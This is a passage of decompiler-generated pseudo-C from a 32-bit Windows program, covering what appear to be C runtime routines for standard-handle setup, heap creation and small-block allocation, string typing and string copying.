				ecx_177 = (word32) eax_247 + 0x0100;
				while (eax_247 < ecx_177)
				{
					*((word32) eax_247 + 0x04) = *((word32) eax_247 + 0x04) & 0x00;
					*eax_247 = *eax_247 | ~0x00;
					*((word32) eax_247 + 0x05) = 0x0A;
					eax_247 = (word32) eax_247 + 0x08;
					ecx_177 = *edi_239 + 0x0100;
				}
				edi_239 = edi_239 + 0x01;
			} while (globals->dw494C20 < esi_165);
		}
		int32 edi_182 = 0x00;
		if (esi_165 > 0x00)
		{
l0040AA0C:
			word32 eax_194 = *ebx_170;
			if (eax_194 != ~0x00)
			{
				byte cl_209 = *ebp_166;
				ecx_177 = DPB(ecx_177, cl_209, 0);
				if ((cl_209 & 0x01) == 0x00)
					goto l0040AA49;
				if ((cl_209 & 0x08) != 0x00)
				{
l0040AA2B:
					struct Eq_8990 * eax_226 = (&globals->t494B20)[edi_182 >> 0x05] + (edi_182 & 0x1F) * 0x08;
					word32 ecx_227 = *ebx_170;
					eax_226->dw0000 = ecx_227;
					byte cl_229 = *ebp_166;
					eax_226->b0004 = cl_229;
					ecx_177 = DPB(ecx_227, cl_229, 0);
					goto l0040AA49;
				}
				*(fp - 88) = eax_194;
				if (GetFileType(*(fp - 88)) != 0x00)
					goto l0040AA2B;
			}
l0040AA49:
			edi_182 = edi_182 + 0x01;
			ebp_166 = ebp_166 + 0x01;
			ebx_170 = ebx_170 + 0x01;
			if (edi_182 < esi_165)
				goto l0040AA0C;
			goto l0040AA52;
		}
	}
l0040AA52:
	int32 ebx_70 = 0x00;
l0040AA54:
	Eq_4 eax_79 = globals->t494B20;
	struct Eq_8823 * esi_82 = (word32) eax_79 + ebx_70 * 0x08;
	if (*((word32) eax_79 + ebx_70 * 0x08) != ~0x00)
	{
		esi_82->b0004 = esi_82->b0004 | 0x80;
		goto l0040AAB3;
	}
	word32 eax_113;
	esi_82->b0004 = 0x81;
	if (ebx_70 == 0x00)
	{
		*(fp - 88) = ~0x09;
		eax_113 = *(fp - 88);
	}
	else
		eax_113 = 0x00 - (0x01 - ebx_70 == 0x00) + ~0x0A;
	*(fp - 88) = eax_113;
	Eq_8 eax_116 = GetStdHandle(*(fp - 88));
	if (eax_116 != (void *) ~0x00)
	{
		*(fp - 88) = (HANDLE *) eax_116;
		Eq_23 eax_131 = GetFileType(*(fp - 88));
		if (eax_131 != 0x00)
		{
			esi_82->t0000 = eax_116;
			if ((eax_131 & 0xFF) != 0x02)
			{
				if ((eax_131 & 0xFF) == 0x03)
					esi_82->b0004 = esi_82->b0004 | 0x08;
l0040AAB3:
				ebx_70 = ebx_70 + 0x01;
				if (ebx_70 < 0x03)
					goto l0040AA54;
				*(fp - 88) = globals->dw494C20;
				SetHandleCount(*(fp - 88));
				return ecx_177;
			}
		}
	}
	esi_82->b0004 = esi_82->b0004 | 0x40;
	goto l0040AAB3;
}

// 0040AACD: Register word32 fn0040AACD(Stack word32 dwArg04)
word32 fn0040AACD(word32 dwArg04)
{
	Eq_8 eax_14 = HeapCreate((word32) (dwArg04 == 0x00), 0x1000, 0x00);
	globals->t494B04 = eax_14;
	if (eax_14 != null)
	{
		if (fn0040B575() != 0x00)
			return 0x01;
		HeapDestroy(globals->t494B04);
	}
	return 0x00;
}

// 0040ACDC: Register Eq_4 fn0040ACDC(Register Eq_4 ebp, Register Eq_4 edi)
Eq_4 fn0040ACDC(Eq_4 ebp, Eq_4 edi)
{
	word32 eax_3 = globals->dw493928;
	if (eax_3 == 0x01 || eax_3 == 0x00 && globals->dw412914 == 0x01)
	{
		Eq_4 edi_22;
		word32 ebx_23 = fn0040AD15(ebp, edi, 252, out edi_22);
		<anonymous> * eax_24 = globals->ptr493AAC;
		ptr32 esp_26 = fp;
		if (eax_24 != null)
		{
			word32 eax_46;
			byte SCZO_47;
			byte Z_48;
			byte SZO_49;
			byte C_50;
			word32 ecx_51;
			word32 ebx_54;
			eax_24();
		}
		*(esp_26 - 0x04) = 0xFF;
		fn0040AD15(ebp, edi_22, dwArg00, out edi);
	}
	return edi;
}

// 0040AD15: Register word32 fn0040AD15(Register Eq_4 ebp, Register Eq_4 edi, Stack word32 dwArg04, Register out ptr32 ediOut)
word32 fn0040AD15(Eq_4 ebp, Eq_4 edi, word32 dwArg04, ptr32 & ediOut)
{
	*ediOut = edi;
	ui32 ecx_15 = 0x00;
	word32 * eax_12 = globals->a412CE8;
	if (dwArg04 != *eax_12)
	{
		eax_12 = eax_12 + 0x02;
		ecx_15 = ecx_15 + 0x01;
		if (eax_12 < &globals->dw412D78)
			goto l0040AD28;
	}
	struct Eq_9108 * esi_125 = ecx_15 << 0x03;
	if (dwArg04 == esi_125->dw412CE8)
	{
		word32 eax_58 = globals->dw493928;
		if (eax_58 != 0x01 && (eax_58 != 0x00 || globals->dw412914 != 0x01))
		{
			if (dwArg04 != 252)
			{
				if (GetModuleFileNameA(null, fp - 424, 0x0104) == 0x00)
					edi = fn00407750(fp - 424);
				*(fp - 0x01B0) = (union Eq_4 *) edi;
				*(fp - 0x01B4) = fp - 424;
				if (fn00407840(dwArg00) > ~0x3A)
				{
					*(fp - 0x01B4) = fp - 424;
					Eq_23 eax_164 = fn00407840(dwArg00);
					*(fp - 440) = 0x03;
					*(fp - 444) = 0x0040D5B8;
					*(fp - 448) = (word32) eax_164 + (fp - 0x01E3);
					word32 ebx_178;
					fn0040AFC0(ebp, dwArg00, dwArg04, dwArg08, dwArg0C, out ebx_178, out esi_125);
				}
				*(fp - 0x01B4) = 4248988;
				*(fp - 440) = fp - 0xA4;
				*(fp - 444) = (union Eq_4 *) fn00407750(dwArg00);
				*(fp - 448) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 0x01C4) = 4248984;
				*(fp - 0x01C8) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 0x01CC) = (union Eq_4 *) esi_125->t412CEC;
				*(fp - 464) = fp - 0xA4;
				fn00407760(dwArg00);
				*(fp - 0x01D4) = 0x00012010;
				*(fp - 0x01D8) = 4248944;
				*(fp - 0x01DC) = fp - 0xA4;
				ebx = fn0040C098();
				word32 edi_159;
				*ediOut = *(fp - 0x01B0);
			}
		}
		else
			WriteFile(GetStdHandle(~0x0B), esi_125->t412CEC, fn00407840(esi_125->t412CEC), fp + 0x04, null);
	}
	return ebx;
}

// 0040AE68: Register Eq_105 fn0040AE68(Register ptr32 ebp, Stack word32 dwArg04, Stack ptr32 dwArg08, Stack word32 dwArg0C, Stack ptr32 dwArg10, Stack Eq_251 dwArg14, Stack Eq_4 dwArg18, Stack word32 dwArg1C)
BOOL fn0040AE68(ptr32 ebp, word32 dwArg04, ptr32 dwArg08, word32 dwArg0C, ptr32 dwArg10, UINT dwArg14, Eq_4 dwArg18, word32 dwArg1C)
{
	Eq_105 eax_126;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	word32 eax_257 = globals->dw493AB0;
	if (eax_257 == 0x00)
	{
		if (GetStringTypeW(0x01, &globals->t40D250, 0x01, fp - 0x20) != 0x00)
			eax_257 = 0x01;
		else
		{
			if (GetStringTypeA(0x00, 0x01, 4248140, 0x01, fp - 0x20) == 0x00)
				goto l0040AF9D;
			eax_257 = 0x02;
		}
		globals->dw493AB0 = eax_257;
	}
	if (eax_257 == 0x02)
	{
		Eq_4 eax_103 = dwArg18;
		if (dwArg18 == 0x00)
			eax_103 = globals->t49393C;
		eax_126 = GetStringTypeA(eax_103, dwArg04, dwArg08, dwArg0C, dwArg10);
l0040AF9F:
		fs->ptr0000 = eax_14;
		return eax_126;
	}
	if (eax_257 == 0x01)
	{
		if (dwArg14 == 0x00)
			dwArg14 = globals->t49394C;
		int32 eax_162 = MultiByteToWideChar(dwArg14, (0x00 - (-dwArg1C == 0x00) & 0x08) + 0x01, dwArg08, dwArg0C, null, 0x00);
		if (eax_162 != 0x00)
		{
			word32 eax_171 = eax_162 * 0x02 + 0x03;
			fn00407F60(DPB(eax_171, (byte) eax_171 & 252, 0), 0x00);
			*(fp - 0x3C) = eax_162 * 0x02;
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = fp - 0x38;
			fn004076F0(dwArg00, bArg04, dwArg08);
			if (fp != 0x38)
			{
				*(fp - 0x3C) = eax_162;
				*(fp - 0x40) = fp - 0x38;
				*(fp - 0x44) = dwArg0C;
				*(fp - 0x48) = (union Eq_23 *) dwArg08;
				*(fp - 0x4C) = 0x01;
				*(fp - 0x50) = (uint32) dwArg14;
				int32 eax_211 = MultiByteToWideChar(*(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
				if (eax_211 != 0x00)
				{
					*(fp - 0x3C) = (LPWORD *) dwArg10;
					*(fp - 0x40) = eax_211;
					*(fp - 0x44) = fp - 0x38;
					*(fp - 0x48) = (union Eq_23 *) dwArg04;
					eax_126 = GetStringTypeW(*(fp - 0x48), *(fp - 0x44), *(fp - 0x40), *(fp - 0x3C));
					goto l0040AF9F;
				}
			}
		}
	}
l0040AF9D:
	eax_126 = 0x00;
	goto l0040AF9F;
}

// 0040AFC0: Register uint32 fn0040AFC0(Stack Eq_4 dwArg00, Stack Eq_4 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C, Stack Eq_4 dwArg10, Register out ptr32 ebxOut, Register out (ptr Eq_6358) esiOut)
uint32 fn0040AFC0(Eq_4 dwArg00, Eq_4 dwArg04, word32 dwArg08, word32 dwArg0C, Eq_4 dwArg10, ptr32 & ebxOut, Eq_6358 * & esiOut)
{
	uint32 ecx_112 = dwArg0C;
	if (dwArg0C == 0x00)
	{
l0040B043:
		word32 ebx_48;
		*ebxOut = ebx;
		word32 esi_49;
		*esiOut = esi;
		return ecx_112;
	}
	byte al_113;
	uint32 ebx_100 = dwArg0C;
	byte * esi_133 = dwArg08;
	byte * edi_102 = dwArg04;
	if ((dwArg08 & 0x03) == 0x00)
	{
		ecx_112 = dwArg0C >> 0x02;
		if (dwArg0C >> 0x02 != 0x00)
			goto l0040B051;
		goto l0040B005;
	}
l0040AFE4:
	al_113 = *esi_133;
	*edi_102 = al_113;
	esi_133 = esi_133 + 0x01;
	edi_102 = edi_102 + 0x01;
	ecx_112 = ecx_112 - 0x01;
	if (ecx_112 == 0x00)
		return ecx_112;
	if (al_113 == 0x00)
	{
		if ((edi_102 & 0x03) != 0x00)
		{
			do
			{
				*edi_102 = al_113;
				edi_102 = edi_102 + 0x01;
				ecx_112 = ecx_112 - 0x01;
				if (ecx_112 == 0x00)
					goto l0040B0B6;
			} while ((edi_102 & 0x03) != 0x00);
		}
		ebx_100 = ecx_112;
		ecx_112 = ecx_112 >> 0x02;
		if (ecx_112 != 0x00)
		{
l0040B0A7:
			do
			{
				*edi_102 = (byte) 0x00;
				edi_102 = edi_102 + 0x04;
				ecx_112 = ecx_112 - 0x01;
			} while (ecx_112 != 0x00);
l0040B0B1:
			al_113 = 0x00;
			ebx_100 = ebx_100 & 0x03;
			if (ebx_100 == 0x00)
			{
l0040B0B6:
				word32 ebx_166;
				*ebxOut = ebx;
				word32 esi_168;
				*esiOut = esi;
				return ecx_112;
			}
		}
		do
		{
			*edi_102 = al_113;
			byte * edi_104 = edi_102 + 0x01;
			*edi_104 = al_113;
			edi_102 = edi_104 + 0x01;
l0040B03E:
			ebx_100 = ebx_100 - 0x01;
		} while (ebx_100 != 0x00);
		goto l0040B043;
	}
	if ((esi_133 & 0x03) != 0x00)
		goto l0040AFE4;
	ebx_100 = ecx_112;
	ecx_112 = ecx_112 >> 0x02;
	if (ecx_112 >> 0x02 == 0x00)
	{
l0040B000:
		ebx_100 = ebx_100 & 0x03;
		if (ebx_100 == 0x00)
			return ecx_112;
l0040B005:
		do
		{
			byte al_136 = *esi_133;
			*edi_102 = al_136;
			byte * esi_137 = esi_133 + 0x01;
			byte * edi_139 = edi_102 + 0x01;
			al_113 = *esi_137;
			*edi_139 = al_113;
			esi_133 = esi_137 + 0x01;
			edi_102 = edi_139 + 0x01;
			if (al_113 == 0x00)
				goto l0040B03E;
			word32 ebx_150 = ebx_100 - 0x01;
			ebx_100 = ebx_150 - 0x01;
		} while (ebx_150 != 0x01);
		return ecx_112;
		word32 ebx_85;
		*ebxOut = dwArg00;
		word32 esi_87;
		*esiOut = dwArg04;
		return ecx_112;
	}
l0040B051:
	Eq_9587 eax_228 = *esi_133;
	union Eq_9603 * esi_233 = esi_133 + 0x04;
	Eq_9603 edx_241 = *esi_233;
	Eq_9603 eax_237 = *esi_233;
	byte dl_242 = (byte) edx_241;
	byte dh_243 = SLICE(edx_241, byte, 8);
	esi_133 = (char *) esi_233 + 0x04;
	if (((eax_237 ^ ~0x00 ^ (word32) eax_237 + 0x7EFEFEFF) & 0x81010100) != 0x00)
	{
		if (dl_242 == 0x00)
		{
			*edi_102 = (byte) 0x00;
			goto l0040B09F;
		}
		if (dh_243 == 0x00)
		{
			*edi_102 = (byte) (edx_241 & 0xFF);
			goto l0040B09F;
		}
		if ((edx_241 & 0x00FF0000) == 0x00)
		{
			*edi_102 = (byte) (edx_241 & 0xFFFF);
			goto l0040B09F;
		}
		if ((edx_241 & 0xFF000000) == 0x00)
		{
			*edi_102 = (byte) edx_241;
			*edi_102 = (byte) edx_241;
l0040B09F:
			edi_102 = edi_102 + 0x04;
			ecx_112 = ecx_112 - 0x01;
			if (ecx_112 != 0x00)
				goto l0040B0A7;
			goto l0040B0B1;
		}
	}
	*edi_102 = (byte) edx_241;
	edi_102 = edi_102 + 0x04;
	ecx_112 = ecx_112 - 0x01;
	if (ecx_112 != 0x00)
		goto l0040B051;
	goto l0040B000;
}

// 0040B575: Register Eq_2 fn0040B575()
Eq_2 fn0040B575()
{
	Eq_2 eax_10 = HeapAlloc(globals->t494B04, 0x00, 0x0140);
	globals->t493AE0 = eax_10;
	if (eax_10 != 0x00)
	{
		globals->t493AD8 = globals->t493AD8 & 0x00;
		globals->dw493ADC = globals->dw493ADC & 0x00;
		globals->t493AD4 = eax_10;
		globals->dw493ACC = 0x10;
		return 0x01;
	}
	else
		return eax_10;
}

// 0040B5B3: Register (ptr Eq_9824) fn0040B5B3(Stack Eq_2 dwArg04)
Eq_9824 * fn0040B5B3(Eq_2 dwArg04)
{
	struct Eq_9824 * eax_15 = (word32) globals->t493AE0 + 0x0C;
	struct Eq_9824 * ecx_6 = eax_15 + ((globals->dw493ADC * 0x05) * 0x04) / 0x0014;
	while (eax_15 < ecx_6)
	{
		if (dwArg04 - eax_15->dw0000 < 0x00100000)
			return eax_15;
		eax_15 = eax_15 + 0x01;
	}
	eax_15 = null;
	return eax_15;
}

// 0040B5DE: void fn0040B5DE(Register Eq_4 ebp, Stack word32 dwArg04, Stack Eq_2 dwArg08, Stack byte bArg0B)
void fn0040B5DE(Eq_4 ebp, word32 dwArg04, Eq_2 dwArg08, byte bArg0B)
{
	Eq_5202 dwArg08_349;
	int32 ebx_21 = *(dwArg08 - 0x04);
	Eq_9857 esi_20 = dwArg08 - *((word32) dwArg04 + 0x0C);
	Eq_9863 eax_18 = *((word32) dwArg04 + 0x0010);
	int32 ecx_35 = ebx_21 - 0x01 + ((word32) dwArg08 - 0x04);
	struct Eq_9874 * edx_22 = (word32) dwArg08 - 0x04;
	Eq_9876 esi_136 = esi_20 >> 0x0F;
	int32 edi_28 = *(dwArg08 - 0x08);
	int32 ebx_293 = ebx_21 - 0x01;
	word32 * ecx_32 = (word32) eax_18 + ((esi_20 >> 0x0F) *s 0x0204 + 0x0144);
	int32 dwLoc10_33 = ebx_21 - 0x01;
	dwArg08_349 = dwArg08;
	if (((byte) ecx_35 & 0x01) == 0x00)
	{
		Eq_5202 ecx_439 = (ecx_35 >> 0x04) - 0x01;
		dwArg08_349 = ecx_439;
		if (ecx_439 > 0x3F)
			dwArg08_349.u0 = 0x3F;
		if (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04) == (ebx_21 + 0x07) + ((word32) dwArg08 - 0x04))
		{
			byte cl_463 = (byte) dwArg08_349;
			if (dwArg08_349 < 0x20)
			{
				uint32 edi_469 = ~(0x80000000 >> cl_463);
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edi_469;
				word32 ecx_468 = dwArg08_349 + 0x04 + eax_18;
				Eq_10011 v17_474 = *ecx_468 - 0x01;
				*ecx_468 = v17_474;
				if (v17_474 == 0x00)
					*dwArg04 = *dwArg04 & edi_469;
			}
			else
			{
				word32 edi_489 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
				*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edi_489;
				word32 ecx_488 = dwArg08_349 + 0x04 + eax_18;
				Eq_10011 v20_494 = *ecx_488 - 0x01;
				*ecx_488 = v20_494;
				if (v20_494 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edi_489;
			}
		}
		*((char *) (ebx_21 + 0x07 + ((word32) dwArg08 - 0x04)) + 0x04) = ebx_21 + 0x03 + ((word32) dwArg08 - 0x04);
		*((char *) (ebx_21 + 0x03 + ((word32) dwArg08 - 0x04)) + 0x08) = ebx_21 + 0x07 + ((word32) dwArg08 - 0x04);
		ebx_293 = ebx_21 - 0x01 + ecx_35;
		dwLoc10_33 = ebx_293;
	}
	Eq_9901 edi_53 = ebx_293 >> 0x04;
	Eq_5202 edi_357 = edi_53 - 0x01;
	if (edi_53 > 0x40)
		edi_357.u0 = 0x3F;
	if ((edi_28 & 0x01) == 0x00)
	{
		Eq_5202 ecx_343 = (edi_28 >> 0x04) - 0x01;
		struct Eq_9874 * edx_337 = (word32) dwArg08 - 0x04 - edi_28;
		dwArg08_349 = ecx_343;
		if (ecx_343 > 0x3F)
		{
			dwArg08_349.u0 = 0x3F;
			ecx_343.u0 = 0x3F;
		}
		ebx_293 = ebx_293 + edi_28;
		dwLoc10_33 = ebx_293;
		edi_357 = (ebx_293 >> 0x04) - 0x01;
		if (edi_357 > 0x3F)
			edi_357.u0 = 0x3F;
		if (ecx_343 != edi_357)
		{
			if (edx_337->ptr0004 == edx_337->ptr0008)
			{
				byte cl_388 = (byte) dwArg08_349;
				if (dwArg08_349 < 0x20)
				{
					uint32 edx_394 = ~(0x80000000 >> cl_388);
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x0044)) & edx_394;
					word32 ecx_393 = dwArg08_349 + 0x04 + eax_18;
					Eq_10011 v23_399 = *ecx_393 - 0x01;
					*ecx_393 = v23_399;
					if (v23_399 == 0x00)
						*dwArg04 = *dwArg04 & edx_394;
				}
				else
				{
					word32 edx_414 = ~(0x80000000 >>u (byte) (dwArg08_349 + ~0x1F));
					*((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) = *((word32) eax_18 + ((esi_20 >> 0x0F) * 0x04 + 0x00C4)) & edx_414;
					word32 ecx_413 = dwArg08_349 + 0x04 + eax_18;
					Eq_10011 v26_419 = *ecx_413 - 0x01;
					*ecx_413 = v26_419;
					if (v26_419 == 0x00)
						*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) & edx_414;
				}
			}
			edx_337->ptr0008->ptr0004 = edx_337->ptr0004;
			edx_337->ptr0004->ptr0008 = edx_337->ptr0008;
		}
		edx_22 = edx_337;
	}
	if ((edi_28 & 0x01) != 0x00 || dwArg08_349 != edi_357)
	{
		edx_22->ptr0004 = (ecx_32 + edi_357 * 0x08)[0x01];
		struct Eq_9874 * ecx_269 = ecx_32 + edi_357 * 0x08;
		edx_22->ptr0008 = ecx_269;
		ecx_269->ptr0004 = edx_22;
		edx_22->ptr0004->ptr0008 = edx_22;
		if (edx_22->ptr0004 == edx_22->ptr0008)
		{
			byte cl_278 = Mem273[edi_357 + 0x04 + eax_18:byte];
			Mem284[edi_357 + 0x04 + eax_18:byte] = cl_278 + 0x01;
			if (edi_357 < 0x20)
			{
				if (cl_278 == 0x00)
					*dwArg04 = *dwArg04 | 0x80000000 >> (byte) edi_357;
				word32 eax_300 = eax_18 + 0x44 + (esi_20 >>u 0x0F) * 0x04;
				*eax_300 = *eax_300 | 0x80000000 >> (byte) edi_357;
			}
			else
			{
				if (cl_278 == 0x00)
					*((word32) dwArg04 + 0x04) = *((word32) dwArg04 + 0x04) | 0x80000000 >> (byte) (edi_357 - (union Eq_10011 *) 0x20);
				word32 eax_321 = eax_18 + 0xC4 + (esi_20 >>u 0x0F) * 0x04;
				*eax_321 = *eax_321 | 0x80000000 >> (byte) (edi_357 - (union Eq_10011 *) 0x20);
			}
			ebx_293 = dwLoc10_33;
		}
	}
	*edx_22 = ebx_293;
	edx_22[(ebx_293 - 0x04) / 0x0C] = (struct Eq_9874) ebx_293;
	word32 v31_91 = *ecx_32 - 0x01;
	*ecx_32 = v31_91;
	if (v31_91 != 0x00)
		return;
	Eq_2 eax_132;
	Eq_2 eax_119 = globals->t493AD8;
	if (eax_119 != 0x00)
	{
		VirtualFree((word32) *((word32) eax_119 + 0x0C) + (globals->t493AD0 << 0x0F), 0x8000, 0x4000);
		Eq_2 eax_171 = globals->t493AD8;
		*((word32) eax_171 + 0x08) = *((word32) eax_171 + 0x08) | 0x80000000 >> (byte) globals->t493AD0;
		Eq_9876 ecx_178 = globals->t493AD0;
		Eq_9863 eax_179 = *((word32) globals->t493AD8 + 0x0010);
		*((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) = *((word32) eax_179 + (ecx_178 * 0x04 + 0x00C4)) & 0x00;
		Eq_9863 eax_184 = *((word32) globals->t493AD8 + 0x0010);
		*((word32) eax_184 + 0x0043) = *((word32) eax_184 + 0x0043) - 0x01;
		Eq_2 eax_187 = globals->t493AD8;
		if (*((word32) *((word32) eax_187 + 0x0010) + 0x0043) == 0x00)
		{
			*((word32) eax_187 + 0x04) = *((word32) eax_187 + 0x04) & ~0x01;
			eax_187 = globals->t493AD8;
		}
		if (*((word32) eax_187 + 0x08) == ~0x00)
		{
			VirtualFree(esp_201->t0000, esp_201->t0004, esp_201->t0008);
			*(esp_203 - 0x04) = (union Eq_9863 *) *((word32) globals->t493AD8 + 0x0010);
			*(esp_203 - 0x08) = 0x00;
			*(esp_203 - 0x0C) = (HANDLE *) globals->t494B04;
			HeapFree(*(esp_203 - 0x0C), *(esp_203 - 0x08), *(esp_203 - 0x04));
			Eq_2 eax_233 = globals->t493AD8;
			*(esp_203 - 0x04) = (word32) globals->t493AE0 + ((globals->dw493ADC * 0x14 - eax_233) - 0x14);
			*(esp_203 - 0x08) = (word32) eax_233 + 0x0014;
			*(esp_203 - 0x0C) = (union Eq_2 *) eax_233;
			eax_132 = fn00407FE0(dwArg00, dwArg04, dwArg08_349, out esi_136)->t0008;
			globals->dw493ADC = globals->dw493ADC - 0x01;
			if (eax_132 > globals->t493AD8)
				eax_132 = eax_132 - 0x14;
			globals->t493AD4 = globals->t493AE0;
l0040B8F9:
			globals->t493AD8 = eax_132;
			globals->t493AD0 = esi_136;
			return;
		}
	}
	eax_132 = dwArg04;
	goto l0040B8F9;
}

// 0040B909: Register ptr32 fn0040B909(Register uint32 esi, Stack uint32 dwArg04, Stack byte bArg07)
ptr32 fn0040B909(uint32 esi, uint32 dwArg04, byte bArg07)
{
	uint32 esi_355;
	uint32 dwLoc0C_33;
	uint32 dwLoc10_32;
	int32 ecx_25 = dwArg04 + 0x17 & ~0x0F;
	Eq_2 edx_9 = globals->t493AE0;
	int32 ecx_28 = (ecx_25 >> 0x04) - 0x01;
	Eq_2 edi_20 = (word32) edx_9 + (globals->dw493ADC * 0x05) * 0x04;
	byte cl_29 = (byte) ecx_28;
	if (ecx_28 < 0x20)
	{
		esi_355 = (esi | ~0x00) >> cl_29;
		dwLoc0C_33 = dwLoc0C | ~0x00;
		dwLoc10_32 = esi_355;
	}
	else
	{
		esi_355 = 0x00;
		dwLoc10_32 = 0x00;
		dwLoc0C_33 = (dwArg04 | ~0x00) >> (byte) (ecx_28 + ~0x1F);
	}
	Eq_2 eax_38 = globals->t493AD4;
	Eq_2 ebx_142 = eax_38;
	Eq_2 dwArg04_395 = eax_38;
	if (eax_38 < edi_20)
	{
		do
		{
			if ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) != 0x00)
				goto l0040B980;
			ebx_142 = (word32) ebx_142 + 0x0014;
			dwArg04_395 = ebx_142;
		} while (ebx_142 < edi_20);
	}
l0040B980:
	ptr32 eax_162;
	if (ebx_142 == edi_20)
	{
		ebx_142 = edx_9;
		while (true)
		{
			bool Z_393 = cond(ebx_142 - eax_38);
			dwArg04_395 = ebx_142;
			if (ebx_142 >= eax_38)
				break;
			if ((*((word32) ebx_142 + 0x04) & dwLoc0C_33 | *ebx_142 & esi_355) != 0x00)
			{
				Z_393 = cond(ebx_142 - eax_38);
				break;
			}
			ebx_142 = (word32) ebx_142 + 0x0014;
		}
		if (!Z_393)
		{
			while (true)
			{
				bool Z_408 = cond(ebx_142 - edi_20);
				if (ebx_142 >= edi_20)
					break;
				if (*((word32) ebx_142 + 0x08) != 0x00)
				{
					Z_408 = cond(ebx_142 - edi_20);
					break;
				}
				ebx_142 = (word32) ebx_142 + 0x0014;
				dwArg04_395 = ebx_142;
			}
			if (!Z_408)
			{
				ebx_142 = (word32) edx_9 + 0x08;
				while (true)
				{
					bool Z_446 = cond(ebx_142 - eax_38);
					dwArg04_395 = ebx_142;
					if (ebx_142 >= eax_38)
						break;
					if (*ebx_142 != 0x00)
					{
						Z_446 = cond(ebx_142 - eax_38);
						break;
					}
					ebx_142 = (word32) ebx_142 + 0x0014;
				}
				if (!Z_446)
				{
					Eq_2 eax_454 = fn0040BC12();
					ebx_142 = eax_454;
					dwArg04_395 = eax_454;
					if (eax_454 == 0x00)
					{
l0040B9F7:
						eax_162 = 0x00;
						return eax_162;
					}
				}
			}
			**((word32) ebx_142 + 0x0010) = fn0040BCC3(ebx_142);
			if (**((word32) ebx_142 + 0x0010) == ~0x00)
				goto l0040B9F7;
		}
	}
	globals->t493AD4 = ebx_142;
	struct Eq_10580 * eax_86 = *((word32) ebx_142 + 0x0010);
	Eq_9876 edx_363 = eax_86->t0000;
	Eq_9876 dwLoc08_347 = edx_363;
	if (edx_363 == ~0x00 || ((eax_86->a00C4)[edx_363] & dwLoc0C_33 | (eax_86->a0044)[edx_363] & esi_355) == 0x00)
	{
		dwLoc08_347 = edx_363 & 0x00;
		ui32 * ecx_349 = eax_86->a0044 + 33;
		esi_355 = dwLoc10_32;
		if ((eax_86->a00C4[0x00] & dwLoc0C_33 | (eax_86->a0044)[0x00] & dwLoc10_32) == 0x00)
		{
			do
			{
				ecx_349 = ecx_526 + 0x01;
				dwLoc08_347 = (word32) dwLoc08_347 + 0x01;
				ui32 * ecx_526 = ecx_349;
			} while ((*ecx_526 & dwLoc0C_33 | dwLoc10_32 & *ecx_349) == 0x00);
		}
		edx_363 = dwLoc08_347;
	}
	int32 edi_108 = 0x00;
	struct Eq_10645 * ecx_97 = eax_86 + (edx_363 *s 0x0204 + 0x0144) / 0x00C4;
	int32 ecx_100 = eax_86->a0044[edx_363] & esi_355;
	if (ecx_100 == 0x00)
	{
		ecx_100 = eax_86->a00C4[edx_363] & dwLoc0C_33;
		edi_108 = 0x20;
	}
	while (ecx_100 >= 0x00)
	{
		ecx_100 = ecx_100 << 0x01;
		edi_108 = edi_108 + 0x01;
	}
	struct Eq_10698 * edx_120 = ecx_97->a0004[edi_108].ptr0000;
	int32 ecx_122 = *edx_120 - ecx_25;
	int32 esi_127 = (ecx_122 >> 0x04) - 0x01;
	if (esi_127 > 0x3F)
		esi_127 = 0x3F;
	if (esi_127 == edi_108)
	{
l0040BBC0:
		if (ecx_122 != 0x00)
		{
			*edx_120 = ecx_122;
			edx_120[(ecx_122 - 0x04) / 0x0C] = (struct Eq_10698) ecx_122;
		}
		goto l0040BBCF;
	}
	if (edx_120->ptr0004 == edx_120->ptr0008)
	{
		if (edi_108 < 0x20)
		{
			uint32 ebx_290 = ~(0x80000000 >> (byte) edi_108);
			eax_86->a0044[dwLoc08_347] = ebx_290 & (eax_86->a0044)[dwLoc08_347];
			byte * edi_289 = (char *) &eax_86->t0000 + 0x04 + edi_108;
			byte v19_295 = *edi_289 - 0x01;
			*edi_289 = v19_295;
			if (v19_295 == 0x00)
			{
				*dwArg04_395 = *dwArg04_395 & ebx_290;
				ebx_142 = dwArg04_395;
				goto l0040BB1C;
			}
l0040BB19:
			ebx_142 = dwArg04_395;
			goto l0040BB1C;
		}
		ui32 * ecx_311 = eax_86->a00C4 + dwLoc08_347;
		uint32 ebx_312 = ~(0x80000000 >> (byte) (edi_108 - 0x20));
		*ecx_311 = *ecx_311 & ebx_312;
		byte * edi_310 = (char *) &eax_86->t0000 + 0x04 + edi_108;
		byte v22_317 = *edi_310 - 0x01;
		*edi_310 = v22_317;
		if (v22_317 != 0x00)
			goto l0040BB19;
		*((word32) dwArg04_395 + 0x04) = *((word32) dwArg04_395 + 0x04) & ebx_312;
		ebx_142 = dwArg04_395;
	}
l0040BB1C:
	edx_120->ptr0008->ptr0004 = edx_120->ptr0004;
	edx_120->ptr0004->ptr0008 = edx_120->ptr0008;
	if (ecx_122 == 0x00)
	{
l0040BBCF:
		word32 * edx_145 = edx_120 + ecx_122 / 0x0C;
		*edx_145 = ecx_25 + 0x01;
